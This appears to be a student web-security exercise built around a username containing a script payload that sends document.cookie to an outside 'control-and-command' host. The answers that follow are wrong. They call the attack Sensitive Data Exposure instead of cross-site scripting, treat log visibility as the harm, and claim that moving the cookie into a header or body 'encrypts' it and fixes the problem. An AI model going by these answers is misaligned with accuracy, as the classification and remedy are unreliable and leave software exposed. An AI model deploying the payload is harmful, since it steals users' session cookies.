## Scenario

The user's pseudo is :
```html
<script>fetch('https://control-and-command.com/?payload=' + document.cookie)</script>
```

## 1. give the targeted vulnerability class, according to OWASP reference.

A3:2017-Sensitive Data Exposure

## 2. explain steps in case of successful exploit of the vulnerability (you can suppose the developer wrote ugly code without any security concern).

If anyone is monitoring server logs or history cache of the browser, they can see the sensitive data being sent in plain text. The sensitive data here is the cookie paste in the URL.

## 3. explain how developers can protect their software against your example.

Developpers would need to use the body or the header of the request to send the cookie instead of the URL. This way, the cookie would be encrypted and not visible in the logs.